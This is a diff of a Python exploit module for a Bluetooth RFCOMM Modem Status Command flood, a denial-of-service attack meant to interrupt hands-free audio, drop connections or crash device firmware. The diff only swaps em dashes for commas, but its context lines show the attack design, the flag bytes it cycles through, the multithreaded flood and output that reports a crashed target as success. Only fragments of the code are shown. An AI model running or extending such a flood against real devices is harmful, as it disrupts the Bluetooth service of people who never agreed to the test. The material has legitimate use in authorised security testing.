@@ -5,7 +5,7 @@ CWE-400 Uncontrolled Resource Consumption via RFCOMM Modem Status Command flood
 A resource exhaustion DoS technique targeting Bluetooth Classic devices that
 expose HFP (Hands-Free Profile) and auxiliary RFCOMM channels. By flooding
 Modem Status Command (MSC) frames at high rate across multiple channels
-simultaneously, the target's RFCOMM stack is overwhelmed — causing HFP
+simultaneously, the target's RFCOMM stack is overwhelmed, causing HFP
 audio interruption, connection drops, or firmware crash depending on the
 implementation's MSC processing model.
 
@@ -15,7 +15,7 @@ state-machine callbacks, creating a serialization bottleneck when flooded.
 Rapid V.24 signal toggling also triggers repeated state transitions that
 exhaust firmware task queues on resource-constrained devices.
 
-This is distinct from CVE-2024-50044 (ABBA deadlock) — it is a pure
+This is distinct from CVE-2024-50044 (ABBA deadlock), it is a pure
 throughput / processing-overload attack not tied to any specific kernel
 version or Linux-only code path.
 
@@ -53,12 +53,12 @@ MCC_MSC = 0xE3   # Modem Status Command type
 #   bit7=DV (data valid)  bit6=IC (ring)  bit5=RTR (RTS/CTS)
 #   bit4=RTC (DTR/DSR)    bit1=FC (flow control)  bit0=EA (always 1)
 V24_VARIANTS = [
-    0x8D,   # DV=1 RTR=1 RTC=1 FC=0  — standard "ready"
+    0x8D,   # DV=1 RTR=1 RTC=1 FC=0 , standard "ready"
     0x00,   # all signals deasserted
     0xFF,   # all bits set
-    0x9D,   # DV=1 IC=1 RTR=1 RTC=1  — ring indicator asserted
+    0x9D,   # DV=1 IC=1 RTR=1 RTC=1 , ring indicator asserted
     0x0D,   # RTR=1 RTC=1 only
-    0x8C,   # DV=1 FC=1              — data valid + flow control
+    0x8C,   # DV=1 FC=1             , data valid + flow control
     0x01,   # FC only
     0x80,   # DV only
 ]
@@ -76,8 +76,8 @@ class Module(ExploitModule):
 
     Attack flow:
     1. Open L2CAP connection(s) to RFCOMM PSM on target
-    2. Init RFCOMM mux — SABM on DLCI 0
-    3. Open each target channel — SABM on DLCI N (channel << 1 | 1)
+    2. Init RFCOMM mux, SABM on DLCI 0
+    3. Open each target channel, SABM on DLCI N (channel << 1 | 1)
     4. Flood UIH-wrapped MSC frames cycling through V24_VARIANTS
     5. Multiple threads attack different channels in parallel
 
@@ -147,7 +147,7 @@ class Module(ExploitModule):
 
     def check(self) -> bool:
         if not BLUETOOTH_AVAILABLE:
-            print_error("pybluez2 required — pip install pybluez2")
+            print_error("pybluez2 required, pip install pybluez2")
             return False
         target = self.get_option("target")
         if not self.validate_bd_addr(target):
@@ -158,7 +158,7 @@ class Module(ExploitModule):
             s.settimeout(5.0)
             s.connect((target, RFCOMM_PSM))
             s.close()
-            print_success(f"RFCOMM PSM reachable — {target} may be vulnerable to MSC flood")
+            print_success(f"RFCOMM PSM reachable, {target} may be vulnerable to MSC flood")
             return True
         except bluetooth.BluetoothError as e:
             print_error(f"Unreachable: {e}")
@@ -166,7 +166,7 @@ class Module(ExploitModule):
 
     def run(self) -> bool:
         if not BLUETOOTH_AVAILABLE:
-            print_error("pybluez2 required — pip install pybluez2")
+            print_error("pybluez2 required, pip install pybluez2")
             return False
         if os.geteuid() != 0:
             print_error("Root privileges required")
@@ -262,7 +262,7 @@ class Module(ExploitModule):
             t.start()
 
         start = time.time()
-        print_info(f"Flooding {target} ({duration}s) — Ctrl-C to abort...")
+        print_info(f"Flooding {target} ({duration}s), Ctrl-C to abort...")
 
         try:
             while time.time() - start < duration:
@@ -294,14 +294,14 @@ class Module(ExploitModule):
                 f"on channels {channels}"
             )
             if not still_alive:
-                print_success("Target not responding after flood — Bluetooth stack may have crashed")
+                print_success("Target not responding after flood, Bluetooth stack may have crashed")
             elif stats["errors"] > stats["frames"] * 0.30:
                 print_success(
-                    f"High error rate ({stats['errors']}/{stats['frames']}) — "
+                    f"High error rate ({stats['errors']}/{stats['frames']}), "
                     "stack saturation likely"
                 )
             else:
-                print_info("Target still responding — stack may be resilient or rate too low")
+                print_info("Target still responding, stack may be resilient or rate too low")
                 print_info("Try increasing rate, connections_per_channel, or duration")
 
             self.add_result({
@@ -315,7 +315,7 @@ class Module(ExploitModule):
             })
             return True
 
-        print_error("No MSC frames sent — target unreachable")
+        print_error("No MSC frames sent, target unreachable")
         return False
 
     def _probe(self, target: str) -> bool:
